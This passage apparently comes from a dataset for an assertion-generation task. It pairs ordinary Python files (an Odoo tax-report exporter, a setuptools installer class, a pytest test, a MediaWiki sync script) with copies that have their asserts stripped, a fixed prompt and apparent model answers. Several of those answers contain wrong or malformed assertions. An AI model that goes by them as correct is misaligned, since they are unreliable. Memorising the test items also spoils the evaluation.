106        # Firma digital opcional, no implementado
107        text += 13 * ' '
108        text += '\r\n'
109
110            _(""The type 0 record must be 500 characters long""))
111        return text
112
113    def _get_formatted_other_records(self, cr, uid, report, context=None):
114        file_contents = ''
115        file_contents += self._get_formated_presenter_record(report)
116
117        for invoice_issued in report.issued:
118            file_contents += self._get_formatted_invoice_issued(
119                cr, uid, report, invoice_issued)
120
121        for invoice_received in report.received:
122            file_contents += self._get_formatted_invoice_received(
123                cr, uid, report, invoice_received)
124
125        return file_contents
126","[['len(text)', '==', '502']]",1,1,1.0,0.0001906214258482,"['_inherit', 'report', 'text', 'cr', 'uid', 'context', 'file_contents']",7,"You are a helpful bot that adds assertions to pieces of Python code.
You will be given a list of variables and a string of code presented in the format:
*Variables:
[...]
*Code:
...
Generate assertions based on the following criteria:
1) Assert that the function can take in all inputs necessary to complete the process
2) Assert that all outputs are of the proper sizes.

Your response should ONLY be a list of assertions in the format:
[line_number, subject_variable, condition_type, target, reasoning]
 -line_number is an integer referencing the line after which the assertion should be inserted
 -subject_variable and target can ONLY be variables from the input list OR integers
 -condition_type can only be a value in this list: [==, >=, <=, !=]
 -reasoning is a short decription of why the assertion was made

Here is an example of what your input will look like and what you should return:
Example Input:
*Variables:
[n]
*Code:
1def fibonacci(n):
2   if n <= 1:
3       return n
4   else:
5       return(recur_fibo(n-1) + recur_fibo(n-2))
Example Output:
[1, n, >=, 1, ""the fibonacci sequence can only be done on posative integers""]

Which would be the same as:
1def fibonacci(n):
2   assert n >= 1
3   if n <= 1:
4       return n
5   else:
6       return(recur_fibo(n-1) + recur_fibo(n-2))


Here is the actual input you should provide assertions for:
*Variables:
['_inherit', 'report', 'text', 'cr', 'uid', 'context', 'file_contents']
*Code:

1# -*- coding: utf-8 -*-
2##############################################################################
3#
4#    Copyright (c) 2013 Acysos S.L. (http://acysos.com) All Rights Reserved.
5#                       Ignacio Ibeas <ignacio@acysos.com>
6#
7#    This program is free software: you can redistribute it and/or modify
8#    it under the terms of the GNU Affero General Public License as published
9#    by the Free Software Foundation, either version 3 of the License, or
10#    (at your option) any later version.
11#
12#    This program is distributed in the hope that it will be useful,
13#    but WITHOUT ANY WARRANTY; without even the implied warranty of
14#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
15#    GNU Affero General Public License for more details.
16#
17#    You should have received a copy of the GNU Affero General Public License
18#    along with this program.  If not, see <http://www.gnu.org/licenses/>.
19#
20##############################################################################
21
22from openerp.osv import orm
23from openerp.tools.translate import _
24
25
26class L10nEsAeatMod340ExportToBoe(orm.TransientModel):
27
28    _inherit = ""l10n.es.aeat.mod340.export_to_boe""
29
30    def _get_formated_presenter_record(self, report):
31        """"""
32        Returns a type 0, declaration/presenter, formated record.
33        Only for Comunidad Foral de Navarra
34
35        Format of the record:
36            Tipo registro 0 – Registro de presentador:
37            Posiciones 	Descripción
38            1           Tipo de Registro
39            2-4 	Modelo Declaración
40            5-8 	Ejercicio
41            9-17 	NIF del presentador
42            18-57 	Apellidos y nombre o razón social del presentador
43            58-59       Domicilio - Siglas de la vía pública
44            60-79       Domicilio - Nombre de la vía pública
45            80-84       Domicilio - Número de la casa o punto kilométrico
46            85-86       Domicilio - Escalera
47            87-88       Domicilio - Piso
48            89-90       Domicilio - Puerta
49            91-95       Domicilio - Código postal
50            96-107      Domicilio - Municipio del presentador
51            108-109     Domicilio - Código provincia
52            110-114     Total de declarantes
53            115-123     Total de declarados
54            124         Tipo de soporte
55            125-133     Télefono de contacto
56            134-173     Apellidos y nombre de la persona de contacto
57            174-487     Relleno a blanco
58            488-500     Sello electrónico
59        """"""
60
61        text = ''
62        # Tipo de Registro
63        text += '0'
64        # Modelo Declaración
65        text += '340'
66        # Ejercicio
67        text += self._formatString(report.fiscalyear_id.code, 4)
68        # NIF del presentador
69        text += self._formatString(report.presenter_vat or '', 9)
70        # Apellidos y nombre del presentador
71        text += self._formatString(report.presenter_name or '', 40)
72        # Siglas de la vía pública
73        text += self._formatString(report.presenter_address_acronym or '', 2)
74        # Nombre de la vía pública
75        text += self._formatString(report.presenter_address_name or '', 20)
76        # Número de la casa
77        text += self._formatNumber(report.presenter_address_number or 0, 5)
78        # Escalera
79        text += self._formatString(report.presenter_address_stair or '', 2)
80        # Piso
81        text += self._formatString(report.presenter_address_floor or '', 2)
82        # Puerta
83        text += self._formatString(report.presenter_address_door or '', 2)
84        # Código postal
85        text += self._formatNumber(int(report.presenter_city_id.name or 0), 5)
86        # Municipio
87        text += self._formatString(report.presenter_city_id.city or '', 12)
88        # Código postal
89        if report.presenter_city_id:
90            text += self._formatNumber(
91                int(report.presenter_city_id.state_id.code), 2)
92        else:
93            text += 2 * ' '
94        # Numero total de declarantes, actualmente solo 1
95        text += '00001'
96        # Número total de registros
97        text += self._formatNumber(report.number_records, 9)
98        # Tipo de soporte
99        text += self._formatString(report.support_type, 1)
100        # Persona de contacto (Teléfono)
101        text += self._formatString(report.presenter_phone_contact or '', 9)
102        # Persona de contacto (Apellidos y nombre)
103        text += self._formatString(report.presenter_name_contact or '', 40)
104        # Blancos
105        text += 314 * ' '
106        # Firma digital opcional, no implementado
107        text += 13 * ' '
108        text += '\r\n'
109
110            _(""The type 0 record must be 500 characters long""))
111        return text
112
113    def _get_formatted_other_records(self, cr, uid, report, context=None):
114        file_contents = ''
115        file_contents += self._get_formated_presenter_record(report)
116
117        for invoice_issued in report.issued:
118            file_contents += self._get_formatted_invoice_issued(
119                cr, uid, report, invoice_issued)
120
121        for invoice_received in report.received:
122            file_contents += self._get_formatted_invoice_received(
123                cr, uid, report, invoice_received)
124
125        return file_contents
126",6933,"[30, 'report', '!=', None, 'the function needs a non-None report to process properly'],
[113, 'report', '!=', None, 'the function needs a non-None report to process properly'],
[113, 'cr', '!=', None, 'the function needs a non-None cursor to query the database'],
[113, 'uid', '!=', None, 'the function needs a non-None user id to check user permissions'],
[110, 'text', '==', 500, 'formatted record must be exactly 500 characters long'],
[125, 'file_contents', '!=', '', 'the contents of file should not be empty after processing']"
igoralmeida/tahoe-lafs,"from distutils.command.install_lib import install_lib as _install_lib
import os

class install_lib(_install_lib):
    """"""Don't add compiled flags to filenames of non-Python files""""""

    def _bytecode_filenames (self, py_filenames):
        bytecode_files = []
        for py_file in py_filenames:
            if not py_file.endswith('.py'):
                continue
            if self.compile:
                bytecode_files.append(py_file + ""c"")
            if self.optimize > 0:
                bytecode_files.append(py_file + ""o"")

        return bytecode_files

    def run(self):
        self.build()
        outfiles = self.install()
        if outfiles is not None:
            # always compile, in case we have any extension stubs to deal with
            self.byte_compile(outfiles)

    def get_exclusions(self):
        exclude = {}
        nsp = self.distribution.namespace_packages

        if (nsp and self.get_finalized_command('install')
               .single_version_externally_managed
        ):
            for pkg in nsp:
                parts = pkg.split('.')
                while parts:
                    pkgdir = os.path.join(self.install_dir, *parts)
                    for f in '__init__.py', '__init__.pyc', '__init__.pyo':
                        exclude[os.path.join(pkgdir,f)] = 1
                    parts.pop()
        return exclude

    def copy_tree(
        self, infile, outfile,
        preserve_mode=1, preserve_times=1, preserve_symlinks=0, level=1
    ):
        assert preserve_mode and preserve_times and not preserve_symlinks
        exclude = self.get_exclusions()

        if not exclude:
            return _install_lib.copy_tree(self, infile, outfile)

        # Exclude namespace package __init__.py* files from the output

        from setuptools.archive_util import unpack_directory
        from distutils import log

        outfiles = []

        def pf(src, dst):
            if dst in exclude:
                log.warn(""Skipping installation of %s (namespace package)"",dst)
                return False

            log.info(""copying %s -> %s"", src, os.path.dirname(dst))
            outfiles.append(dst)
            return dst

        unpack_directory(infile, outfile, pf)
        return outfiles

    def get_outputs(self):
        outputs = _install_lib.get_outputs(self)
        exclude = self.get_exclusions()
        if exclude:
            return [f for f in outputs if f not in exclude]
        return outputs
","
1from distutils.command.install_lib import install_lib as _install_lib
2import os
3
4class install_lib(_install_lib):
5    """"""Don't add compiled flags to filenames of non-Python files""""""
6
7    def _bytecode_filenames (self, py_filenames):
8        bytecode_files = []
9        for py_file in py_filenames:
10            if not py_file.endswith('.py'):
11                continue
12            if self.compile:
13                bytecode_files.append(py_file + ""c"")
14            if self.optimize > 0:
15                bytecode_files.append(py_file + ""o"")
16
17        return bytecode_files
18
19    def run(self):
20        self.build()
21        outfiles = self.install()
22        if outfiles is not None:
23            # always compile, in case we have any extension stubs to deal with
24            self.byte_compile(outfiles)
25
26    def get_exclusions(self):
27        exclude = {}
28        nsp = self.distribution.namespace_packages
29
30        if (nsp and self.get_finalized_command('install')
31               .single_version_externally_managed
32        ):
33            for pkg in nsp:
34                parts = pkg.split('.')
35                while parts:
36                    pkgdir = os.path.join(self.install_dir, *parts)
37                    for f in '__init__.py', '__init__.pyc', '__init__.pyo':
38                        exclude[os.path.join(pkgdir,f)] = 1
39                    parts.pop()
40        return exclude
41
42    def copy_tree(
43        self, infile, outfile,
44        preserve_mode=1, preserve_times=1, preserve_symlinks=0, level=1
45    ):
46        exclude = self.get_exclusions()
47
48        if not exclude:
49            return _install_lib.copy_tree(self, infile, outfile)
50
51        # Exclude namespace package __init__.py* files from the output
52
53        from setuptools.archive_util import unpack_directory
54        from distutils import log
55
56        outfiles = []
57
58        def pf(src, dst):
59            if dst in exclude:
60                log.warn(""Skipping installation of %s (namespace package)"",dst)
61                return False
62
63            log.info(""copying %s -> %s"", src, os.path.dirname(dst))
64            outfiles.append(dst)
65            return dst
66
67        unpack_directory(infile, outfile, pf)
68        return outfiles
69
70    def get_outputs(self):
71        outputs = _install_lib.get_outputs(self)
72        exclude = self.get_exclusions()
73        if exclude:
74            return [f for f in outputs if f not in exclude]
75        return outputs
76","[['preserve_mode', '==', 'True'], ['preserve_times', '==', 'True'], ['preserve_symlinks', '==', 'False']]",1,3,3.0,0.0012096774193548,"['py_filenames', 'bytecode_files', 'outfiles', 'exclude', 'nsp', 'parts', 'pkgdir', 'exclude[os.path.join(pkgdir', 'f)]', 'src', 'dst', 'outputs']",12,"You are a helpful bot that adds assertions to pieces of Python code.
You will be given a list of variables and a string of code presented in the format:
*Variables:
[...]
*Code:
...
Generate assertions based on the following criteria:
1) Assert that the function can take in all inputs necessary to complete the process
2) Assert that all outputs are of the proper sizes.

Your response should ONLY be a list of assertions in the format:
[line_number, subject_variable, condition_type, target, reasoning]
 -line_number is an integer referencing the line after which the assertion should be inserted
 -subject_variable and target can ONLY be variables from the input list OR integers
 -condition_type can only be a value in this list: [==, >=, <=, !=]
 -reasoning is a short decription of why the assertion was made

Here is an example of what your input will look like and what you should return:
Example Input:
*Variables:
[n]
*Code:
1def fibonacci(n):
2   if n <= 1:
3       return n
4   else:
5       return(recur_fibo(n-1) + recur_fibo(n-2))
Example Output:
[1, n, >=, 1, ""the fibonacci sequence can only be done on posative integers""]

Which would be the same as:
1def fibonacci(n):
2   assert n >= 1
3   if n <= 1:
4       return n
5   else:
6       return(recur_fibo(n-1) + recur_fibo(n-2))


Here is the actual input you should provide assertions for:
*Variables:
['py_filenames', 'bytecode_files', 'outfiles', 'exclude', 'nsp', 'parts', 'pkgdir', 'exclude[os.path.join(pkgdir', 'f)]', 'src', 'dst', 'outputs']
*Code:

1from distutils.command.install_lib import install_lib as _install_lib
2import os
3
4class install_lib(_install_lib):
5    """"""Don't add compiled flags to filenames of non-Python files""""""
6
7    def _bytecode_filenames (self, py_filenames):
8        bytecode_files = []
9        for py_file in py_filenames:
10            if not py_file.endswith('.py'):
11                continue
12            if self.compile:
13                bytecode_files.append(py_file + ""c"")
14            if self.optimize > 0:
15                bytecode_files.append(py_file + ""o"")
16
17        return bytecode_files
18
19    def run(self):
20        self.build()
21        outfiles = self.install()
22        if outfiles is not None:
23            # always compile, in case we have any extension stubs to deal with
24            self.byte_compile(outfiles)
25
26    def get_exclusions(self):
27        exclude = {}
28        nsp = self.distribution.namespace_packages
29
30        if (nsp and self.get_finalized_command('install')
31               .single_version_externally_managed
32        ):
33            for pkg in nsp:
34                parts = pkg.split('.')
35                while parts:
36                    pkgdir = os.path.join(self.install_dir, *parts)
37                    for f in '__init__.py', '__init__.pyc', '__init__.pyo':
38                        exclude[os.path.join(pkgdir,f)] = 1
39                    parts.pop()
40        return exclude
41
42    def copy_tree(
43        self, infile, outfile,
44        preserve_mode=1, preserve_times=1, preserve_symlinks=0, level=1
45    ):
46        exclude = self.get_exclusions()
47
48        if not exclude:
49            return _install_lib.copy_tree(self, infile, outfile)
50
51        # Exclude namespace package __init__.py* files from the output
52
53        from setuptools.archive_util import unpack_directory
54        from distutils import log
55
56        outfiles = []
57
58        def pf(src, dst):
59            if dst in exclude:
60                log.warn(""Skipping installation of %s (namespace package)"",dst)
61                return False
62
63            log.info(""copying %s -> %s"", src, os.path.dirname(dst))
64            outfiles.append(dst)
65            return dst
66
67        unpack_directory(infile, outfile, pf)
68        return outfiles
69
70    def get_outputs(self):
71        outputs = _install_lib.get_outputs(self)
72        exclude = self.get_exclusions()
73        if exclude:
74            return [f for f in outputs if f not in exclude]
75        return outputs
76",4076,"[[7, 'py_filenames', '!=', None, 'function needs an input to continue'],
 [17, 'bytecode_files', '!=', None, 'function should return a result'],
 [21, 'outfiles', '!=', None, 'function should return a result'],
 [26, 'exclude', '==', {}, 'initialize an empty dictionary'],
 [30, 'nsp', '!=', None, 'function needs an input to continue'],
 [38, 'exclude[os.path.join(pkgdir', 'f)]', '!=', None, ''-init-.py*', '__init__.pyc', '__init__.pyo' files should be added to exclude'],
 [40, 'exclude', '!=', None, 'function should return a result'],
 [42, 'infile', '!=', None, 'copy_tree method needs an input to continue'],
 [42, 'outfile', '!=', None, 'copy_tree method needs an output to continue'],
 [64, 'outfiles', '!=', None, 'function should return a result'],
 [68, 'outfiles', '!=', None, 'function should return a result'],
 [70, 'outputs', '!=', None, 'get_outputs method needs an output to continue'],
 [74, 'outputs', '!=', None, '""get_outputs"" function should return a result'],
 [75, 'outputs', '!=', None, '""get_outputs"" function should return a result']]"
lemontree-testing/python_training,"# -*- coding: utf-8 -*-
from model.group import Group

def test_add_group(app, db, json_groups, check_ui):
    group = json_groups
    old_groups = db.get_group_list()
    app.group.create(group)
    new_groups = db.get_group_list()
    old_groups.append(group)
    assert sorted(old_groups, key = Group.id_or_max) == sorted(new_groups, key = Group.id_or_max)
    if check_ui:
        assert sorted(new_groups, key=Group.id_or_max) == sorted(app.group.get_group_list(), key=Group.id_or_max)



","
1# -*- coding: utf-8 -*-
2from model.group import Group
3
4def test_add_group(app, db, json_groups, check_ui):
5    group = json_groups
6    old_groups = db.get_group_list()
7    app.group.create(group)
8    new_groups = db.get_group_list()
9    old_groups.append(group)
10    if check_ui:
11
12
13
14","[['sorted(old_groups', '==', 'True'], ['sorted(new_groups', '==', 'True']]",2,2,1.0,0.0040485829959514,"['app', 'db', 'json_groups', 'check_ui', 'group', 'old_groups', 'new_groups', 'assert sorted(old_groups', 'key']",9,"You are a helpful bot that adds assertions to pieces of Python code.
You will be given a list of variables and a string of code presented in the format:
*Variables:
[...]
*Code:
...
Generate assertions based on the following criteria:
1) Assert that the function can take in all inputs necessary to complete the process
2) Assert that all outputs are of the proper sizes.

Your response should ONLY be a list of assertions in the format:
[line_number, subject_variable, condition_type, target, reasoning]
 -line_number is an integer referencing the line after which the assertion should be inserted
 -subject_variable and target can ONLY be variables from the input list OR integers
 -condition_type can only be a value in this list: [==, >=, <=, !=]
 -reasoning is a short decription of why the assertion was made

Here is an example of what your input will look like and what you should return:
Example Input:
*Variables:
[n]
*Code:
1def fibonacci(n):
2   if n <= 1:
3       return n
4   else:
5       return(recur_fibo(n-1) + recur_fibo(n-2))
Example Output:
[1, n, >=, 1, ""the fibonacci sequence can only be done on posative integers""]

Which would be the same as:
1def fibonacci(n):
2   assert n >= 1
3   if n <= 1:
4       return n
5   else:
6       return(recur_fibo(n-1) + recur_fibo(n-2))


Here is the actual input you should provide assertions for:
*Variables:
['app', 'db', 'json_groups', 'check_ui', 'group', 'old_groups', 'new_groups', 'assert sorted(old_groups', 'key']
*Code:

1# -*- coding: utf-8 -*-
2from model.group import Group
3
4def test_add_group(app, db, json_groups, check_ui):
5    group = json_groups
6    old_groups = db.get_group_list()
7    app.group.create(group)
8    new_groups = db.get_group_list()
9    old_groups.append(group)
10    if check_ui:
11
12
13
14",1794,"[[5, 'group', '!=', None, ""group should not be None""],
[5, 'json_groups', '!=', None, ""json_groups should not be None""],
[6, 'old_groups', '!=', None, ""old_groups should not be None""],
[8, 'new_groups', '!=', None, ""new_groups should not be None""],
[8, 'new_groups', '==', 'old_groups', ""after creating a new group, the total number of groups should increase by 1""],
[10, 'check_ui', '==', True, ""check_ui should be a boolean""]]"
mozilla/wikimo_opsec,"#!/usr/bin/env python3
# This Source Code Form is subject to the terms of the Mozilla Public
# License, v. 2.0. If a copy of the MPL was not distributed with this
# file, You can obtain one at http://mozilla.org/MPL/2.0/.
#
# Copyright (c) Mozilla Corporation, 2015
#
# Contributors:
# Guillaume Destuynder (kang@mozilla.com)
#
# ABOUT:
# This is a wikimedia sync tool to ease managing files in a Git repository (for example).
# It can automatically get/push files and show diff comparisons.
#
# TODO:
# Support non *.mediawiki content such as images.
# Support exploring/listing a wiki space that doesn't yet exist on disk.

import mwclient
import hjson as json
import os, fnmatch
import hashlib
import difflib
import sys
import getopt
import subprocess

def connect(config):
    site = mwclient.Site(('https', config['site']), clients_useragent=config['useragent'])
    site.login(config['username'], config['password'])
    return site

def get_mediawiki_files_from_disk(config):
    docs = []
    for root, dirnames, filenames in os.walk(config['basedir']):
        for filename in fnmatch.filter(filenames, '*.mediawiki'):
            docs.append(os.path.join(root, filename).strip('./').rstrip('.mediawiki'))
    return docs

def blist2str(l):
    assert type(l) is list

    out = []
    for i in l:
        if type(i) is bytes:
            out.append(i.decode('utf-8'))
        else:
            out.append(i)
    return out

def check_repos_is_current(config):
    ret = subprocess.call([""git"", ""pull"", ""--ff-only"", config['repos'], ""master""])
    if (ret != 0):
        print (""Operation cancelled: Failed to update from upstream repository. Check you have the latest version of the wiki checked-out  before attempting to push again."")
        sys.exit(3)

def compare_site_and_disk(config, diff, site, docs, push, get):
    ''' Does both compare and push/get since it's quite similar code-wide'''
    for f in docs:
        full_path = './'+f+'.mediawiki'
        m_ondisk = hashlib.new(config['hashalg'])
        with open(full_path) as fd:
            on_disk = fd.read()
        m_ondisk.update(on_disk.encode('utf-8'))

        m_onsite = hashlib.new(config['hashalg'])
        page = site.Pages[f]
        on_site = page.text().encode('utf-8')+'\n'.encode('utf-8')
        m_onsite.update(on_site)

        if m_ondisk.digest() != m_onsite.digest():
            print(""Page {} differ."".format(f))
            if (diff):
                #Just display diff in the correct order, we default to push-side-diff
                if get:
                    mydiff = difflib.unified_diff(blist2str(on_site.splitlines(1)), blist2str(on_disk.splitlines(1)))
                else:
                    mydiff = difflib.unified_diff(blist2str(on_disk.splitlines(1)), blist2str(on_site.splitlines(1)))

                sys.stdout.writelines(mydiff)

            #Now push or get whatever is needed to sync
            #But never do both push and get at once, would make no sense
            if get:
                print(""Getting {} from site to disk."".format(f))
                with open(full_path, 'w') as fd:
                    fd.write(on_site.decode('utf-8'))
            elif push:
                check_repos_is_current(config)
                print(""Pushing {} from disk to site."".format(f))
                page.save(on_disk, summary=u'Automated sync from {}'.format(config['repos']))

def main(opts, args):
    diff=False
    get=False
    push=False
    for o, a in opts:
        if o in ('-h', '--help'):
            usage()
            sys.exit()
        elif o in ('-d', '--diff'):
            diff=True
        elif o in ('-p', '--push'):
            if get:
                print(""You can't both get and push. Choose one!"")
                usage()
                sys.exit(2)
            push=True
        elif o in ('-g', '--get'):
            if push:
                print(""You can't both get and push. Choose one!"")
                usage()
                sys.exit(2)
            get=True
        else:
            assert False, ""unhandled option {}"".format(o)


    with open('sync.json') as fd:
        config = json.load(fd)
    site = connect(config)
    docs = get_mediawiki_files_from_disk(config)
    compare_site_and_disk(config, diff, site, docs, push, get)

def usage():
    print(""""""USAGE: {argv} [OPTIONS]

-h, --help      Shows this help text.
-d, --diff      Also shows a unified diff during comparison, upload or download.

-p, --push      Upload from disk to wiki (will overwrite wiki contents!).
-g, --get       Download from wiki to disk (you'll still want to git commit).
"""""".format(argv=sys.argv[0]))

if __name__ == ""__main__"":
    try:
        opts, args = getopt.getopt(sys.argv[1:], ""hdpg"", [""help"", ""diff"", ""push"", ""get""])
    except getopt.GetoptError as err:
        print(str(err))
        usage()
        sys.exit(2)
    main(opts, args)
","
1#!/usr/bin/env python3
2# This Source Code Form is subject to the terms of the Mozilla Public
3# License, v. 2.0. If a copy of the MPL was not distributed with this
4# file, You can obtain one at http://mozilla.org/MPL/2.0/.
5#
6# Copyright (c) Mozilla Corporation, 2015
7#
8# Contributors:
9# Guillaume Destuynder (kang@mozilla.com)
10#
11# ABOUT:
12# This is a wikimedia sync tool to ease managing files in a Git repository (for example).
13# It can automatically get/push files and show diff comparisons.
14#
15# TODO:
16# Support non *.mediawiki content such as images.
17# Support exploring/listing a wiki space that doesn't yet exist on disk.
18
19import mwclient
20import hjson as json
21import os, fnmatch
22import hashlib
23import difflib
24import sys
25import getopt
26import subprocess
27
28def connect(config):
29    site = mwclient.Site(('https', config['site']), clients_useragent=config['useragent'])
30    site.login(config['username'], config['password'])
31    return site
32
33def get_mediawiki_files_from_disk(config):
34    docs = []
35    for root, dirnames, filenames in os.walk(config['basedir']):
36        for filename in fnmatch.filter(filenames, '*.mediawiki'):
37            docs.append(os.path.join(root, filename).strip('./').rstrip('.mediawiki'))
38    return docs
39
40def blist2str(l):
41
42    out = []
43    for i in l:
44        if type(i) is bytes:
45            out.append(i.decode('utf-8'))
46        else:
47            out.append(i)
48    return out
49
50def check_repos_is_current(config):
51    ret = subprocess.call([""git"", ""pull"", ""--ff-only"", config['repos'], ""master""])
52    if (ret != 0):
53        print (""Operation cancelled: Failed to update from upstream repository. Check you have the latest version of the wiki checked-out  before attempting to push again."")
54        sys.exit(3)
55
56def compare_site_and_disk(config, diff, site, docs, push, get):
57    ''' Does both compare and push/get since it's quite similar code-wide'''
58    for f in docs:
59        full_path = './'+f+'.mediawiki'
60        m_ondisk = hashlib.new(config['hashalg'])
61        with open(full_path) as fd:
62            on_disk = fd.read()
63        m_ondisk.update(on_disk.encode('utf-8'))
64
65        m_onsite = hashlib.new(config['hashalg'])
66        page = site.Pages[f]
67        on_site = page.text().encode('utf-8')+'\n'.encode('utf-8')
68        m_onsite.update(on_site)
69
70        if m_ondisk.digest() != m_onsite.digest():
71            print(""Page {} differ."".format(f))
72            if (diff):
73                #Just display diff in the correct order, we default to push-side-diff
74                if get:
75                    mydiff = difflib.unified_diff(blist2str(on_site.splitlines(1)), blist2str(on_disk.splitlines(1)))
76                else:
77                    mydiff = difflib.unified_diff(blist2str(on_disk.splitlines(1)), blist2str(on_site.splitlines(1)))
78
79                sys.stdout.writelines(mydiff)
80
81            #Now push or get whatever is needed to sync
82            #But never do both push and get at once, would make no sense
83            if get:
84                print(""Getting {} from site to disk."".format(f))
85                with open(full_path, 'w') as fd:
86                    fd.write(on_site.decode('utf-8'))
87            elif push:
88                check_repos_is_current(config)
89                print(""Pushing {} from disk to site."".format(f))
90                page.save(on_disk, summary=u'Automated sync from {}'.format(config['repos']))
91
92def main(opts, args):
93    diff=False
94    get=False
95    push=False
96    for o, a in opts:
97        if o in ('-h', '--help'):
98            usage()
99            sys.exit()
100        elif o in ('-d', '--diff'):
101            diff=True
102        elif o in ('-p', '--push'):
103            if get:
104                print(""You can't both get and push. Choose one!"")
105                usage()
106                sys.exit(2)
107            push=True
108        elif o in ('-g', '--get'):
109            if push:
110                print(""You can't both get and push. Choose one!"")
111                usage()
112                sys.exit(2)
113            get=True
114        else:
115
116
117    with open('sync.json') as fd:
118        config = json.load(fd)
119    site = connect(config)
120    docs = get_mediawiki_files_from_disk(config)
121    compare_site_and_disk(config, diff, site, docs, push, get)
122
123def usage():
124    print(""""""USAGE: {argv} [OPTIONS]
125
126-h, --help      Shows this help text.
127-d, --diff      Also shows a unified diff during comparison, upload or download.
128
129-p, --push      Upload from disk to wiki (will overwrite wiki contents!).
130-g, --get       Download from wiki to disk (you'll still want to git commit).
131"""""".format(argv=sys.argv[0]))
132
133if __name__ == ""__main__"":
134    try:
135        opts, args = getopt.getopt(sys.argv[1:], ""hdpg"", [""help"", ""diff"", ""push"", ""get""])
136    except getopt.GetoptError as err:
137        print(str(err))
138        usage()
139        sys.exit(2)
140    main(opts, args)
141","[['type(l)', '==', 'list'], ['False', '==', 'True'], ['led', 'option', '{}"".format(o)']]",2,3,1.5,0.000613371498671,"['config', 'site', 'docs', 'l', 'out', 'ret', 'diff', 'push', 'get', 'full_path', 'm_ondisk', 'on_disk', 'm_onsite', 'page', 'on_site', 'mydiff', 'opts', 'args']",18,"You are a helpful bot that adds assertions to pieces of Python code.
You will be given a list of variables and a string of code presented in the format:
*Variables:
[...]
*Code:
...
Generate assertions based on the following criteria:
1) Assert that the function can take in all inputs necessary to complete the process
2) Assert that all outputs are of the proper sizes.

Your response should ONLY be a list of assertions in the format:
[line_number, subject_variable, condition_type, target, reasoning]
 -line_number is an integer referencing the line after which the assertion should be inserted
 -subject_variable and target can ONLY be variables from the input list OR integers
 -condition_type can only be a value in this list: [==, >=, <=, !=]
 -reasoning is a short decription of why the assertion was made

Here is an example of what your input will look like and what you should return:
Example Input:
*Variables:
[n]
*Code:
1def fibonacci(n):
2   if n <= 1:
3       return n
4   else:
5       return(recur_fibo(n-1) + recur_fibo(n-2))
Example Output:
[1, n, >=, 1, ""the fibonacci sequence can only be done on posative integers""]

Which would be the same as:
1def fibonacci(n):
2   assert n >= 1
3   if n <= 1:
4       return n
5   else:
6       return(recur_fibo(n-1) + recur_fibo(n-2))


Here is the actual input you should provide assertions for:
*Variables:
['config', 'site', 'docs', 'l', 'out', 'ret', 'diff', 'push', 'get', 'full_path', 'm_ondisk', 'on_disk', 'm_onsite', 'page', 'on_site', 'mydiff', 'opts', 'args']
*Code:

1#!/usr/bin/env python3
2# This Source Code Form is subject to the terms of the Mozilla Public
3# License, v. 2.0. If a copy of the MPL was not distributed with this
4# file, You can obtain one at http://mozilla.org/MPL/2.0/.
5#
6# Copyright (c) Mozilla Corporation, 2015
7#
8# Contributors:
9# Guillaume Destuynder (kang@mozilla.com)
10#
11# ABOUT:
12# This is a wikimedia sync tool to ease managing files in a Git repository (for example).
13# It can automatically get/push files and show diff comparisons.
14#
15# TODO:
16# Support non *.mediawiki content such as images.
17# Support exploring/listing a wiki space that doesn't yet exist on disk.
18
19import mwclient
20import hjson as json
21import os, fnmatch
22import hashlib
23import difflib
24import sys
25import getopt
26import subprocess
27
28def connect(config):
29    site = mwclient.Site(('https', config['site']), clients_useragent=config['useragent'])
30    site.login(config['username'], config['password'])
31    return site
32
33def get_mediawiki_files_from_disk(config):
34    docs = []
35    for root, dirnames, filenames in os.walk(config['basedir']):
36        for filename in fnmatch.filter(filenames, '*.mediawiki'):
37            docs.append(os.path.join(root, filename).strip('./').rstrip('.mediawiki'))
38    return docs
39
40def blist2str(l):
41
42    out = []
43    for i in l:
44        if type(i) is bytes:
45            out.append(i.decode('utf-8'))
46        else:
47            out.append(i)
48    return out
49
50def check_repos_is_current(config):
51    ret = subprocess.call([""git"", ""pull"", ""--ff-only"", config['repos'], ""master""])
52    if (ret != 0):
53        print (""Operation cancelled: Failed to update from upstream repository. Check you have the latest version of the wiki checked-out  before attempting to push again."")
54        sys.exit(3)
55
56def compare_site_and_disk(config, diff, site, docs, push, get):
57    ''' Does both compare and push/get since it's quite similar code-wide'''
58    for f in docs:
59        full_path = './'+f+'.mediawiki'
60        m_ondisk = hashlib.new(config['hashalg'])
61        with open(full_path) as fd:
62            on_disk = fd.read()
63        m_ondisk.update(on_disk.encode('utf-8'))
64
65        m_onsite = hashlib.new(config['hashalg'])
66        page = site.Pages[f]
67        on_site = page.text().encode('utf-8')+'\n'.encode('utf-8')
68        m_onsite.update(on_site)
69
70        if m_ondisk.digest() != m_onsite.digest():
71            print(""Page {} differ."".format(f))
72            if (diff):
73                #Just display diff in the correct order, we default to push-side-diff
74                if get:
75                    mydiff = difflib.unified_diff(blist2str(on_site.splitlines(1)), blist2str(on_disk.splitlines(1)))
76                else:
77                    mydiff = difflib.unified_diff(blist2str(on_disk.splitlines(1)), blist2str(on_site.splitlines(1)))
78
79                sys.stdout.writelines(mydiff)
80
81            #Now push or get whatever is needed to sync
82            #But never do both push and get at once, would make no sense
83            if get:
84                print(""Getting {} from site to disk."".format(f))
85                with open(full_path, 'w') as fd:
86                    fd.write(on_site.decode('utf-8'))
87            elif push:
88                check_repos_is_current(config)
89                print(""Pushing {} from disk to site."".format(f))
90                page.save(on_disk, summary=u'Automated sync from {}'.format(config['repos']))
91
92def main(opts, args):
93    diff=False
94    get=False
95    push=False
96    for o, a in opts:
97        if o in ('-h', '--help'):
98            usage()
99            sys.exit()
100        elif o in ('-d', '--diff'):
101            diff=True
102        elif o in ('-p', '--push'):
103            if get:
104                print(""You can't both get and push. Choose one!"")
105                usage()
106                sys.exit(2)
107            push=True
108        elif o in ('-g', '--get'):
109            if push:
110                print(""You can't both get and push. Choose one!"")
111                usage()
112                sys.exit(2)
113            get=True
114        else:
115
116
117    with open('sync.json') as fd:
118        config = json.load(fd)
119    site = connect(config)
120    docs = get_mediawiki_files_from_disk(config)
121    compare_site_and_disk(config, diff, site, docs, push, get)
122
123def usage():
124    print(""""""USAGE: {argv} [OPTIONS]
125
126-h, --help      Shows this help text.
127-d, --diff      Also shows a unified diff during comparison, upload or download.
128
129-p, --push      Upload from disk to wiki (will overwrite wiki contents!).
130-g, --get       Download from wiki to disk (you'll still want to git commit).
131"""""".format(argv=sys.argv[0]))
132
133if __name__ == ""__main__"":
134    try:
